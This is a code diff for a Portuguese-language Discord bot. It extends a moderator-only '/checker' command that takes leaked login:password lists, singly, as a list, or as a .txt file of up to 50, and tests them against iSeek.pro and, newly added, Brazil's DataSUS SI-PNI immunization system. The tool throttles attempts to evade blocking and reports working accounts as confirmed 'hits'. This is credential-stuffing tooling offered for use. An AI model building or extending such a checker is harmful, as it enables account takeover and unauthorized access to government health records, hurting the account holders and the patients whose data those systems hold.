@@ -538,37 +538,33 @@ const COMMANDS = [
 
   new SlashCommandBuilder()
     .setName("checker")
-    .setDescription("🔑 Checker de credenciais — testa logins no iseek.pro")
+    .setDescription("🔑 Checker de credenciais — iSeek.pro ou DataSUS (SI-PNI)")
     .addSubcommand(sub =>
       sub.setName("single")
-        .setDescription("🔑 Verificar uma credencial")
+        .setDescription("🔑 Verificar uma credencial (formato: login:senha ou email:senha)")
         .addStringOption(opt =>
-          opt.setName("email")
-            .setDescription("E-mail para testar")
+          opt.setName("credencial")
+            .setDescription("No formato login:senha — ex: user@gmail.com:123456")
             .setRequired(true)
-        )
-        .addStringOption(opt =>
-          opt.setName("senha")
-            .setDescription("Senha para testar")
-            .setRequired(true)
+            .setMaxLength(500)
         )
     )
     .addSubcommand(sub =>
       sub.setName("multi")
-        .setDescription("📋 Verificar múltiplas credenciais (formato: email:senha,email2:senha2 — máx 10)")
+        .setDescription("📋 Verificar múltiplas credenciais — máx 10 (separadas por vírgula, ponto-e-vírgula ou linha)")
         .addStringOption(opt =>
           opt.setName("lista")
-            .setDescription("Credenciais separadas por vírgula ou ponto-e-vírgula: email:senha,email2:senha2")
+            .setDescription("Ex: user1@gmail.com:123,user2@gmail.com:456 — aceita qualquer separador")
             .setRequired(true)
             .setMaxLength(2000)
         )
     )
     .addSubcommand(sub =>
       sub.setName("arquivo")
-        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: email:senha) — máx 50")
+        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: login:senha) — máx 50")
         .addAttachmentOption(opt =>
           opt.setName("arquivo")
-            .setDescription("Arquivo .txt com email:senha por linha")
+            .setDescription("Arquivo .txt com login:senha por linha")
             .setRequired(true)
         )
     ),
@@ -3763,7 +3759,7 @@ async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<vo
 
 // ── Checker ───────────────────────────────────────────────────────────────────
 async function handleChecker(interaction: ChatInputCommandInteraction): Promise<void> {
-  const callerId = interaction.user.id;
+  const callerId   = interaction.user.id;
   const callerName = interaction.user.username;
   if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
     await interaction.reply({
@@ -3773,6 +3769,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     return;
   }
 
+  // Defer for file download (may take >3s)
   await interaction.deferReply({ flags: MessageFlags.Ephemeral });
   const sub = interaction.options.getSubcommand();
 
@@ -3780,16 +3777,22 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
   let credentials: string[] = [];
 
   if (sub === "single") {
-    const email = interaction.options.getString("email", true).trim();
-    const senha = interaction.options.getString("senha", true).trim();
-    credentials = [`${email}:${senha}`];
+    const cred  = interaction.options.getString("credencial", true).trim();
+    // Accept "email:senha" as single string OR separate options
+    if (cred.includes(":")) {
+      credentials = [cred];
+    } else {
+      const senha = interaction.options.getString("senha")?.trim() ?? "";
+      credentials = senha ? [`${cred}:${senha}`] : [];
+    }
   } else if (sub === "multi") {
     const lista = interaction.options.getString("lista", true);
-    credentials = lista.split(/[,;\n]+/).map(s => s.trim()).filter(Boolean).slice(0, 10);
+    // Accept newline, comma, semicolon, pipe as separators
+    credentials = lista.split(/[\n,;|]+/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 10);
   } else if (sub === "arquivo") {
     const att = interaction.options.getAttachment("arquivo", true);
     if (!att.contentType?.includes("text") && !att.name.endsWith(".txt")) {
-      await interaction.editReply({ embeds: [buildErrorEmbed("FORMATO INVÁLIDO", "Envie um arquivo `.txt` com uma credencial por linha no formato `email:senha`.")] });
+      await interaction.editReply({ embeds: [buildErrorEmbed("FORMATO INVÁLIDO", "Envie um arquivo `.txt` com uma credencial por linha no formato `login:senha`.")] });
       return;
     }
     if (att.size > 512_000) {
@@ -3798,7 +3801,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     }
     try {
       const text = await fetch(att.url).then(r => r.text());
-      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(Boolean).slice(0, 50);
+      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 50);
     } catch {
       await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Não foi possível baixar o arquivo. Tente novamente.")] });
       return;
@@ -3806,30 +3809,86 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
   }
 
   if (credentials.length === 0) {
-    await interaction.editReply({ embeds: [buildErrorEmbed("SEM CREDENCIAIS", "Nenhuma credencial válida encontrada.")] });
+    await interaction.editReply({ embeds: [buildErrorEmbed("SEM CREDENCIAIS", "Nenhuma credencial válida encontrada.\n\nFormatos aceitos: `email:senha`, `usuario:senha`")] });
     return;
   }
 
-  // ── Status message while checking ─────────────────────────────────────────
-  const estimateSecs = credentials.length * 17;
+  // ── Show target selection (buttons) ───────────────────────────────────────
+  const selectRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
+    new ButtonBuilder()
+      .setCustomId("chk_iseek")
+      .setLabel("🌐  iSeek.pro")
+      .setStyle(ButtonStyle.Primary),
+    new ButtonBuilder()
+      .setCustomId("chk_datasus")
+      .setLabel("🏥  DataSUS (SI-PNI)")
+      .setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder()
+      .setCustomId("chk_cancel")
+      .setLabel("✖ Cancelar")
+      .setStyle(ButtonStyle.Danger),
+  );
+
   await interaction.editReply({
     embeds: [new EmbedBuilder()
-      .setColor(COLORS.GOLD ?? 0xF1C40F)
-      .setTitle("⏳ CHECKER — VERIFICANDO...")
+      .setColor(0xF1C40F)
+      .setTitle("🔑 CHECKER — SELECIONE O ALVO")
       .setDescription(
-        `Testando **${credentials.length}** credencial${credentials.length === 1 ? "" : "s"} no **iseek.pro**\n\n` +
+        `**${credentials.length}** credencial${credentials.length === 1 ? "" : "s"} pronta${credentials.length === 1 ? "" : "s"} para checar.\n\n` +
+        `Escolha em qual sistema deseja verificar:`,
+      )
+      .addFields(
+        { name: "🌐 iSeek.pro",        value: "Plataforma iSeek — verifica login por redirecionamento CSRF", inline: true },
+        { name: "🏥 DataSUS / SI-PNI", value: "Sistema Nacional de Imunizações — verifica via JSF + SHA-512",  inline: true },
+      )
+      .setFooter({ text: `${AUTHOR} • Expire em 60s` })],
+    components: [selectRow],
+  });
+
+  // ── Await button click ────────────────────────────────────────────────────
+  const reply = await interaction.fetchReply();
+  let btnInteraction: import("discord.js").ButtonInteraction | null = null;
+  try {
+    btnInteraction = await reply.awaitMessageComponent({
+      componentType: ComponentType.Button,
+      filter: (b) => b.user.id === callerId && b.customId.startsWith("chk_"),
+      time: 60_000,
+    });
+  } catch {
+    await interaction.editReply({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhum alvo selecionado em 60s. Operação cancelada.")], components: [] });
+    return;
+  }
+
+  if (btnInteraction.customId === "chk_cancel") {
+    await btnInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
+    return;
+  }
+
+  const target: "iseek" | "datasus" = btnInteraction.customId === "chk_iseek" ? "iseek" : "datasus";
+  const targetLabel = target === "iseek" ? "iSeek.pro" : "DataSUS / SI-PNI";
+  const targetIcon  = target === "iseek" ? "🌐" : "🏥";
+
+  // ── Acknowledge button + show progress ────────────────────────────────────
+  const estimateSecs = credentials.length * 17;
+  await btnInteraction.update({
+    embeds: [new EmbedBuilder()
+      .setColor(0xF1C40F)
+      .setTitle(`⏳ CHECKER — VERIFICANDO... ${targetIcon}`)
+      .setDescription(
+        `Testando **${credentials.length}** credencial${credentials.length === 1 ? "" : "s"} em **${targetLabel}**\n\n` +
         `⏱️ Tempo estimado: ~${estimateSecs}s\n` +
-        `*(Uma por uma, com intervalo de 1.5s para evitar bloqueio)*`,
+        `*(Uma por vez, com intervalo de 1.5s para evitar bloqueio)*`,
       )
       .setFooter({ text: AUTHOR })],
+    components: [],
   });
 
   // ── Call API ───────────────────────────────────────────────────────────────
   let resp: CheckerResponse;
   try {
-    resp = await api.checkerBulk(credentials);
+    resp = await api.checkerBulk(credentials, target);
   } catch (err) {
-    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha ao comunicar com a API:\n\`${String(err)}\``)] });
+    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha ao comunicar com a API:\n\`${String(err)}\``)], components: [] });
     return;
   }
 
@@ -3838,47 +3897,48 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
 
   const lines = resp.results.map(r => {
-    const icon    = statusEmoji(r.status);
-    const detail  = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
-    return `${icon} \`${r.credential}\`\n> ${detail}`;
+    const icon   = statusEmoji(r.status);
+    const cred   = r.credential.length > 50 ? r.credential.slice(0, 47) + "..." : r.credential;
+    const detail = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
+    return `${icon} \`${cred}\`\n> ${detail}`;
   });
 
-  // Split into chunks (Discord embed description max 4096)
   const chunks: string[][] = [[]];
   for (const line of lines) {
-    const cur = chunks[chunks.length - 1];
+    const cur    = chunks[chunks.length - 1];
     const curLen = cur.join("\n\n").length;
     if (curLen + line.length + 2 > 3800) chunks.push([line]);
     else cur.push(line);
   }
 
+  const resultColor = resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED;
+
   const embeds: EmbedBuilder[] = chunks.map((chunk, i) => {
     const isFirst = i === 0;
     return new EmbedBuilder()
-      .setColor(resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED)
-      .setTitle(isFirst ? "🔑 CHECKER — RESULTADOS" : `🔑 CHECKER — RESULTADOS (${i + 1})`)
+      .setColor(resultColor)
+      .setTitle(isFirst ? `${targetIcon} CHECKER ${targetLabel.toUpperCase()} — RESULTADOS` : `${targetIcon} CHECKER — RESULTADOS (${i + 1})`)
       .setDescription(isFirst
         ? `📊 **${resp.total}** testada${resp.total === 1 ? "" : "s"} — ✅ **${resp.hits} HIT** | ❌ **${resp.fails} FAIL** | ⚠️ **${resp.errors} ERRO**\n\n` +
           chunk.join("\n\n")
         : chunk.join("\n\n"),
       )
       .setTimestamp(isFirst ? new Date() : null)
-      .setFooter(isFirst ? { text: `${AUTHOR} • iseek.pro checker` } : null);
+      .setFooter(isFirst ? { text: `${AUTHOR} • ${targetLabel}` } : null);
   });
 
-  // If there are HITs, also send a clean hits-only summary at the end
   const hits = resp.results.filter(r => r.status === "HIT");
   if (hits.length > 0) {
     const hitsText = hits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n");
     embeds.push(new EmbedBuilder()
       .setColor(COLORS.GREEN)
-      .setTitle(`✅ HITS CONFIRMADOS (${hits.length})`)
+      .setTitle(`✅ HITS CONFIRMADOS (${hits.length}) — ${targetIcon} ${targetLabel}`)
       .setDescription(hitsText.slice(0, 4000))
       .setFooter({ text: `${AUTHOR} • ${hits.length} conta${hits.length === 1 ? "" : "s"} válida${hits.length === 1 ? "" : "s"}` }),
     );
   }
 
-  await interaction.editReply({ embeds: embeds.slice(0, 10) });
+  await interaction.editReply({ embeds: embeds.slice(0, 10), components: [] });
 }
 
 // ── Consulta ─────────────────────────────────────────────────────────────────
